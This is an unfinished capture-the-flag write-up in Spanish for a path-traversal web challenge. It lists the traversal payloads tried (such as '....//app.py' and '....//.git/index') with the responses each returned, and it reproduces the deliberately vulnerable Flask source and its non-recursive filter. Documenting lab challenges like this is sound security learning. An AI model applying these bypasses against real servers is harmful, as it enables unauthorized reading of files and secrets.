# Desafío 50 — Archivo de historias clínicas (path traversal) — EN CURSO

| Campo | Valor |
|---|---|
| Evento | Código de Marte 2026-11-13 (`codigodemarte20261113`) |
| Categoría | Web / path traversal (filtro no recursivo) |
| Dificultad | media |
| Puntos | 434 (8 soluciones) |
| Objetivo | `http://203.0.113.10:8006` |
| Estado | 🚧 en curso — objetivo sin respuesta HTTP al cierre de la sesión |
| Flag | *(pendiente)* |

## Enunciado

> El visor abre documentos públicos y asegura estar "protegido contra recorrido de rutas". Las historias reservadas están en otra carpeta.

## Reconocimiento

- `GET /` lista tres documentos públicos (`indice_publico.txt`, `manual_archivo.txt`,
  `registro_turno.txt`) servidos por `/ver?doc=<nombre>`.
- Los documentos indican:
  - públicos en `publicos/`
  - historias reservadas en `confidencial/`
  - `registro_turno.txt`: «Solicitud de historia 40217 (denegada, sin autorización)».

### Filtro (deducido y confirmado con el código)

`doc.replace("../", "")` una sola vez, `realpath`, y contención dentro de `/app`:

| Entrada | Resultado observado |
|---|---|
| `../indice_publico.txt` | 200 (el `../` se elimina → `indice_publico.txt`) |
| `....//publicos/indice_publico.txt` | 200 → tras el filtro queda `../publicos/…` (bypass) |
| `../publicos/indice_publico.txt` | 404 → queda `publicos/…` dentro de `publicos/` |
| `....//app.py` | **200 → código fuente de la aplicación** |
| `..//indice_publico.txt` | 403 (queda una ruta absoluta `/indice...`) |
| `....//....//app.py` | 403 (doble traversal real, fuera de `/app`) |
| `/etc/passwd` | 403 (contención: solo se puede leer dentro de `/app`) |

## Código fuente obtenido

```python
import os
from flask import Flask, render_template, request, send_from_directory

app = Flask(__name__)
APP_DIR = os.path.realpath(os.path.dirname(os.path.abspath(__file__)))
DOCS_DIR = os.path.join(APP_DIR, "publicos")

@app.route("/cdm.css")
def css():
    return send_from_directory(".", "cdm.css")

@app.route("/")
def index():
    docs = sorted(os.listdir(DOCS_DIR))
    return render_template("index.html", docs=docs)

@app.route("/ver")
def ver():
    doc = request.args.get("doc", "")
    # VULNERABLE: el filtro elimina "../" una sola vez, no de forma recursiva
    limpio = doc.replace("../", "")
    ruta = os.path.realpath(os.path.join(DOCS_DIR, limpio))
    # Contencion del reto: nunca se sale de la carpeta de la aplicacion
    if not ruta.startswith(APP_DIR + os.sep):
        return render_template("ver.html", doc=doc, error="Acceso denegado :: ruta fuera del archivo del hospital."), 403
    if not os.path.isfile(ruta):
        return render_template("ver.html", doc=doc, error="Documento no encontrado."), 404
    with open(ruta, "r", errors="replace") as f:
        contenido = f.read(20000)
    return render_template("ver.html", doc=doc, contenido=contenido)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
```

`Dockerfile` (también leído con `....//Dockerfile`): `python:3.12-slim`, `WORKDIR /app`,
`COPY . .`, usuario `ctf`, `gunicorn --preload -b 0.0.0.0:5000 -w 2 app:app`.

Conclusión: **el bypass funciona y se puede leer cualquier archivo dentro de `/app`**. Lo que falta
es el nombre exacto del archivo de `confidencial/`.

## Hipótesis descartadas / pendientes

- Se probaron nombres evidentes (`confidencial/historia_40217.txt`, variantes de mayúsculas,
  extensiones y otros directorios) sin éxito. **La fuerza bruta de nombres no es el camino.**
- Siguiente vía (sin adivinar): enumerar el contenido real de `/app` leyendo artefactos del build:
  - `....//.git/index` (rutas versionadas, incluidas las de `confidencial/`)
  - `....//.git/logs/HEAD`, `....//.git/refs/heads/main`
  - otros artefactos del contexto de build (`docker-compose.yml`, `entrypoint.sh`, `Makefile`,
    `README.md`, `.dockerignore`) que puedan citar el nombre.
- Alternativa: si el `confidencial/` desplegado incluye un índice o `README`, leerlo con el mismo
  bypass.

## Bloqueo

El servicio en `203.0.113.10:8006` dejó de responder HTTP (timeouts; los demás puertos del host sí
responden). Probablemente los dos workers de gunicorn quedaron saturados tras las pruebas o el
contenedor necesita reinicio desde la plataforma. **Reintentar cuando la instancia esté arriba.**

Herramienta de recon: `scripts/recon.py` (lee `app.py`/`Dockerfile` y prueba rutas candidatas con el
bypass `....//`).
